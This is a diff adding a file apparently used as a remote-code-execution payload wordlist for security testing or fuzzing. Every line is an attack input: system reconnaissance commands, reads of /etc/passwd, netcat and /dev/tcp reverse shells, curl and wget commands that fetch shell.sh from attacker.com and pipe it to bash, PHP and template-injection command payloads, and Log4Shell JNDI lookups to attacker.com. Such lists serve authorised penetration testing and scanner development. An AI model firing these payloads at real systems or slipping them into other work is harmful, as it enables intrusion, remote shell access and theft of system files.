@@ -1,0 +1,36 @@
+# RCE Payloads - Remote Code Execution
+whoami
+id
+uname -a
+ls -la
+dir
+cat /etc/passwd
+type C:\Windows\win.ini
+ping -c 4 127.0.0.1
+ping 127.0.0.1 -n 4
+nc -e /bin/sh 127.0.0.1 4444
+/bin/bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+curl http://attacker.com/shell.sh | bash
+wget http://attacker.com/shell.sh -O /tmp/shell.sh
+system('id')
+shell_exec('whoami')
+passthru('ls -la')
+exec('cat /etc/passwd')
+${@system('id')}
+<?php system('id'); ?>
+<?php echo shell_exec('whoami'); ?>
+<?php echo exec('ls -la'); ?>
+<?php passthru('cat /etc/passwd'); ?>
+`whoami`
+$(whoami)
+{system('id')}
+{{system('id')}}
+<% system('id') %>
+<%= system('id') %>
+${jndi:ldap://attacker.com/a}
+${jndi:rmi://attacker.com/a}
+${jndi:dns://attacker.com/a}
+${jndi:nis://attacker.com/a}
+${jndi:nds://attacker.com/a}
+${jndi:corba://attacker.com/a}
+${jndi:iiop://attacker.com/a}
